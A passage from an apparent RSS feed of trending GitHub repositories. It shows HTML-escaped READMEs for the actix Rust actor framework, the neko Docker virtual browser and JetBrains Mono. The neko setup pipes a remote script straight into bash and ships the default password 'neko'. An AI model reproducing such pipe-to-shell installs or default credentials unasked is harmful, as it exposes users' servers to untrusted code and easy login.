            _ &lt;span class="pl-k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="pl-c1"&gt;println!&lt;/span&gt;(&lt;span class="pl-s"&gt;"Something wrong"&lt;/span&gt;),
        }

        System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;current&lt;/span&gt;().&lt;span class="pl-en"&gt;stop&lt;/span&gt;();
        future&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;result&lt;/span&gt;(&lt;span class="pl-c1"&gt;Ok&lt;/span&gt;(()))
    }));

    sys.&lt;span class="pl-en"&gt;run&lt;/span&gt;();
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;All communications with actors go through an &lt;code&gt;Addr&lt;/code&gt; object. You can &lt;code&gt;do_send&lt;/code&gt; a message
without waiting for a response, or &lt;code&gt;send&lt;/code&gt; an actor with specific message. The &lt;code&gt;Message&lt;/code&gt;
trait defines the result type for a message.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-actor-state-and-subscription-for-specific-messages" class="anchor" aria-hidden="true" href="#actor-state-and-subscription-for-specific-messages"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Actor state and subscription for specific messages&lt;/h3&gt;
&lt;p&gt;You may have noticed that methods of &lt;code&gt;Actor&lt;/code&gt; and &lt;code&gt;Handler&lt;/code&gt; traits accept &lt;code&gt;&amp;amp;mut self&lt;/code&gt;, so you are
welcome to store anything in an actor and mutate it whenever necessary.&lt;/p&gt;
&lt;p&gt;Address objects require an actor type, but if we just want to send a specific message to
an actor that can handle the message, we can use the &lt;code&gt;Recipient&lt;/code&gt; interface. Let's create
a new actor that uses &lt;code&gt;Recipient&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight highlight-source-rust"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;use&lt;/span&gt; std&lt;span class="pl-k"&gt;::&lt;/span&gt;time&lt;span class="pl-k"&gt;::&lt;/span&gt;Duration;
&lt;span class="pl-k"&gt;use&lt;/span&gt; actix&lt;span class="pl-k"&gt;::&lt;/span&gt;prelude&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-k"&gt;*&lt;/span&gt;;

#[derive(Message)]
&lt;span class="pl-k"&gt;struct&lt;/span&gt; &lt;span class="pl-en"&gt;Ping&lt;/span&gt; { &lt;span class="pl-k"&gt;pub&lt;/span&gt; id: &lt;span class="pl-k"&gt;usize&lt;/span&gt; }

&lt;span class="pl-c"&gt;// Actor definition&lt;/span&gt;
&lt;span class="pl-k"&gt;struct&lt;/span&gt; &lt;span class="pl-en"&gt;Game&lt;/span&gt; {
    counter: &lt;span class="pl-k"&gt;usize&lt;/span&gt;,
    addr: Recipient&lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt;Ping&lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt;,
}

&lt;span class="pl-k"&gt;impl&lt;/span&gt; &lt;span class="pl-en"&gt;Actor&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; &lt;span class="pl-en"&gt;Game&lt;/span&gt; {
    &lt;span class="pl-k"&gt;type&lt;/span&gt; &lt;span class="pl-en"&gt;Context&lt;/span&gt; = Context&amp;lt;Game&amp;gt;;
}

&lt;span class="pl-c"&gt;// simple message handler for Ping message&lt;/span&gt;
&lt;span class="pl-k"&gt;impl&lt;/span&gt; &lt;span class="pl-en"&gt;Handler&lt;/span&gt;&amp;lt;Ping&amp;gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; &lt;span class="pl-en"&gt;Game&lt;/span&gt; {
    &lt;span class="pl-k"&gt;type&lt;/span&gt; &lt;span class="pl-en"&gt;Result&lt;/span&gt; = ();

    &lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;handle&lt;/span&gt;(&lt;span class="pl-k"&gt;&amp;amp;&lt;/span&gt;&lt;span class="pl-k"&gt;mut&lt;/span&gt; &lt;span class="pl-c1"&gt;self&lt;/span&gt;, msg: Ping, ctx: &lt;span class="pl-k"&gt;&amp;amp;&lt;/span&gt;&lt;span class="pl-k"&gt;mut&lt;/span&gt; Context&amp;lt;&lt;span class="pl-k"&gt;Self&lt;/span&gt;&amp;gt;) {
        &lt;span class="pl-c1"&gt;self&lt;/span&gt;.counter &lt;span class="pl-k"&gt;+=&lt;/span&gt; &lt;span class="pl-c1"&gt;1&lt;/span&gt;;

        &lt;span class="pl-k"&gt;if&lt;/span&gt; &lt;span class="pl-c1"&gt;self&lt;/span&gt;.counter &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; &lt;span class="pl-c1"&gt;10&lt;/span&gt; {
            System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;current&lt;/span&gt;().&lt;span class="pl-en"&gt;stop&lt;/span&gt;();
        } &lt;span class="pl-k"&gt;else&lt;/span&gt; {
            &lt;span class="pl-c1"&gt;println!&lt;/span&gt;(&lt;span class="pl-s"&gt;"Ping received {:?}"&lt;/span&gt;, msg.id);

            &lt;span class="pl-c"&gt;// wait 100 nanos&lt;/span&gt;
            ctx.&lt;span class="pl-en"&gt;run_later&lt;/span&gt;(Duration&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;(&lt;span class="pl-c1"&gt;0&lt;/span&gt;, &lt;span class="pl-c1"&gt;100&lt;/span&gt;), &lt;span class="pl-k"&gt;move&lt;/span&gt; &lt;span class="pl-k"&gt;|&lt;/span&gt;act, _&lt;span class="pl-k"&gt;|&lt;/span&gt; {
                act.addr.&lt;span class="pl-en"&gt;do_send&lt;/span&gt;(Ping{id: msg.id &lt;span class="pl-k"&gt;+&lt;/span&gt; &lt;span class="pl-c1"&gt;1&lt;/span&gt;});
            });
        }
    }
}

&lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;main&lt;/span&gt;() {
    &lt;span class="pl-k"&gt;let&lt;/span&gt; system &lt;span class="pl-k"&gt;=&lt;/span&gt; System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;(&lt;span class="pl-s"&gt;"test"&lt;/span&gt;);

    &lt;span class="pl-c"&gt;// To get a Recipient object, we need to use a different builder method&lt;/span&gt;
    &lt;span class="pl-c"&gt;// which will allow postponing actor creation&lt;/span&gt;
    &lt;span class="pl-k"&gt;let&lt;/span&gt; addr &lt;span class="pl-k"&gt;=&lt;/span&gt; Game&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;create&lt;/span&gt;(&lt;span class="pl-k"&gt;|&lt;/span&gt;ctx&lt;span class="pl-k"&gt;|&lt;/span&gt; {
        &lt;span class="pl-c"&gt;// now we can get an address of the first actor and create the second actor&lt;/span&gt;
        &lt;span class="pl-k"&gt;let&lt;/span&gt; addr &lt;span class="pl-k"&gt;=&lt;/span&gt; ctx.&lt;span class="pl-en"&gt;address&lt;/span&gt;();
        &lt;span class="pl-k"&gt;let&lt;/span&gt; addr2 &lt;span class="pl-k"&gt;=&lt;/span&gt; Game{counter: &lt;span class="pl-c1"&gt;0&lt;/span&gt;, addr: addr.&lt;span class="pl-en"&gt;recipient&lt;/span&gt;()}.&lt;span class="pl-en"&gt;start&lt;/span&gt;();

        &lt;span class="pl-c"&gt;// let's start pings&lt;/span&gt;
        addr2.&lt;span class="pl-en"&gt;do_send&lt;/span&gt;(Ping{id: &lt;span class="pl-c1"&gt;10&lt;/span&gt;});

        &lt;span class="pl-c"&gt;// now we can finally create first actor&lt;/span&gt;
        Game{counter: &lt;span class="pl-c1"&gt;0&lt;/span&gt;, addr: addr2.&lt;span class="pl-en"&gt;recipient&lt;/span&gt;()}
    });

    system.&lt;span class="pl-en"&gt;run&lt;/span&gt;();
}&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-chat-example" class="anchor" aria-hidden="true" href="#chat-example"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;chat example&lt;/h3&gt;
&lt;p&gt;There is a
&lt;a href="https://github.com/actix/actix/tree/master/examples/chat"&gt;chat example&lt;/a&gt;
which provides a basic example of networking client/server service.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-fectl" class="anchor" aria-hidden="true" href="#fectl"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;fectl&lt;/h3&gt;
&lt;p&gt;You may consider checking out &lt;a href="https://github.com/fafhrd91/fectl"&gt;fectl&lt;/a&gt; utility. It is written
with &lt;code&gt;actix&lt;/code&gt; and shows how to create networking application with relatively complex interactions.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;All contributions are welcome, if you have a feature request don't hesitate to open an issue!&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;This project is licensed under either of&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache License, Version 2.0, (&lt;a href="LICENSE-APACHE"&gt;LICENSE-APACHE&lt;/a&gt; or
&lt;a href="http://www.apache.org/licenses/LICENSE-2.0" rel="nofollow"&gt;http://www.apache.org/licenses/LICENSE-2.0&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;MIT license (&lt;a href="LICENSE-MIT"&gt;LICENSE-MIT&lt;/a&gt; or
&lt;a href="http://opensource.org/licenses/MIT" rel="nofollow"&gt;http://opensource.org/licenses/MIT&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;at your option.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-code-of-conduct" class="anchor" aria-hidden="true" href="#code-of-conduct"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Code of Conduct&lt;/h2&gt;
&lt;p&gt;Contribution to the actix crate is organized under the terms of the
Contributor Covenant, the maintainer of actix, @fafhrd91, promises to
intervene to uphold that code of conduct.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>actix</author><guid isPermaLink="false">https://github.com/actix/actix</guid><pubDate>Sun, 19 Jan 2020 00:05:00 GMT</pubDate></item><item><title>nurdism/neko #6 in All Languages, Today</title><link>https://github.com/nurdism/neko</link><description>&lt;p&gt;&lt;i&gt;A self hosted virtual browser (rabb.it clone) that runs in docker.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;div align="center"&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://github.com/nurdism/neko/raw/master/.github/logo.png"&gt;&lt;img src="https://github.com/nurdism/neko/raw/master/.github/logo.png" width="650" height="auto" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;div align="center"&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://github.com/nurdism/neko/raw/master/.github/demo.gif"&gt;&lt;img src="https://github.com/nurdism/neko/raw/master/.github/demo.gif" width="650" height="auto" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h1&gt;&lt;a id="user-content-neko" class="anchor" aria-hidden="true" href="#neko"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;strong&gt;n&lt;/strong&gt;.eko&lt;/h1&gt;
&lt;p&gt;This is a proof of concept project I threw together over the last few days, it's not perfect, but it looks nice. This uses web rtc to stream a desktop inside of a docker container, I made this because &lt;a href="https://en.wikipedia.org/wiki/Rabb.it" rel="nofollow"&gt;rabb.it&lt;/a&gt; went under and my internet can't handle streaming and discord keeps crashing. I just want to watch anime with my friends ლ(ಠ益ಠლ) so I started digging throughout the net and found a few &lt;em&gt;kinda&lt;/em&gt; clones, but non of them had the virtual browser, then I found &lt;a href="https://github.com/Khauri/Turtus"&gt;Turtus&lt;/a&gt; and I was able to figure out the rest.&lt;/p&gt;
&lt;p&gt;This is by no means a fully featured clone of rabbit. The client has no concept of other peers. It has bugs, but for the most part it works. I'm not sure what the future holds for this. If I continue to use it and like it, I'll probably keep pushing updates to it. I'd be happy to accept PRs for any improvements.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-why-neko" class="anchor" aria-hidden="true" href="#why-neko"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why n.eko?&lt;/h3&gt;
&lt;p&gt;I like cats (Neko is the Japanese word for cat), I'm a weeb/nerd, I own the domain &lt;a href="https://n.eko.moe/" rel="nofollow"&gt;n.eko.moe&lt;/a&gt; and I love the logo /shrug&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-super-easy-mode-setup" class="anchor" aria-hidden="true" href="#super-easy-mode-setup"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Super easy mode setup&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Deploy a server&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Recomended specs:&lt;/em&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Resolution&lt;/th&gt;
&lt;th&gt;Cores&lt;/th&gt;
&lt;th&gt;Ram&lt;/th&gt;
&lt;th&gt;Recommendation&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;576p&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2gb&lt;/td&gt;
&lt;td&gt;Not Recommended&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;720p&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;4gb&lt;/td&gt;
&lt;td&gt;Good Performance&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;720p&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;6gb&lt;/td&gt;
&lt;td&gt;Recommended&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;720p+&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;8gb&lt;/td&gt;
&lt;td&gt;Best Performance&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.digitalocean.com/docs/droplets/how-to/connect-with-ssh/" rel="nofollow"&gt;SSH into your VPS&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install Docker&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -sSL https://get.docker.com/ | CHANNEL=stable bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run these commands:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ufw allow 80/tcp
wget https://raw.githubusercontent.com/nurdism/neko/master/docker-compose.yaml
docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Visit the IP address of the droplet in your browser and login, the default password is &lt;code&gt;neko&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Protip&lt;/em&gt;: Run &lt;code&gt;nano docker-compose.yaml&lt;/code&gt; to edit the settings, then press &lt;em&gt;ctrl+x&lt;/em&gt; to exit and save the file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a id="user-content-running-the-container" class="anchor" aria-hidden="true" href="#running-the-container"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Running the container:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sudo docker run -p 8080:8080 -e NEKO_PASSWORD='secret' --shm-size=1gb nurdism/neko:latest 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; &lt;code&gt;--shm-size=1gb&lt;/code&gt; is required, firefox-esr tabs will crash&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-config" class="anchor" aria-hidden="true" href="#config"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Config&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;NEKO_USER=$USERNAME     // User
NEKO_DISPLAY=0          // Display number
NEKO_WIDTH=1280         // Display width
NEKO_HEIGHT=720         // Display height
NEKO_PASSWORD=neko      // Password
NEKO_BIND=0.0.0.0:8080  // Bind
NEKO_KEY=               // (SSL)Key 
NEKO_CERT=              // (SSL)Cert
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-development" class="anchor" aria-hidden="true" href="#development"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Development&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;Highly&lt;/em&gt; recommend you use a &lt;a href="https://code.visualstudio.com/docs/remote/containers" rel="nofollow"&gt;dev container&lt;/a&gt; for &lt;a href="https://code.visualstudio.com/" rel="nofollow"&gt;vscode&lt;/a&gt;, I've included the &lt;code&gt;.devcontainer&lt;/code&gt; I've used to develop this app. To build neko run:
&lt;code&gt;cd .docker &amp;amp;&amp;amp; ./build&lt;/code&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>nurdism</author><guid isPermaLink="false">https://github.com/nurdism/neko</guid><pubDate>Sun, 19 Jan 2020 00:06:00 GMT</pubDate></item><item><title>JetBrains/JetBrainsMono #7 in All Languages, Today</title><link>https://github.com/JetBrains/JetBrainsMono</link><description>&lt;p&gt;&lt;i&gt; JetBrains Mono – the free and open-source typeface for developers&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;a href="https://confluence.jetbrains.com/display/ALL/JetBrains+on+GitHub" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c558aa8079c9095e7e944ab3db6d8e69ea01af97/687474703a2f2f6a622e67672f6261646765732f6f6666696369616c2e737667" alt="official JetBrains project" data-canonical-src="http://jb.gg/badges/official.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-jetbrainsmono" class="anchor" aria-hidden="true" href="#jetbrainsmono"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JetBrainsMono&lt;/h1&gt;
&lt;p&gt;A typeface made for developers. &lt;br&gt;
More about font features &amp;amp; design can be found on &lt;a href="https://jetbrains.com/mono/" rel="nofollow"&gt;its page&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/h1&gt;
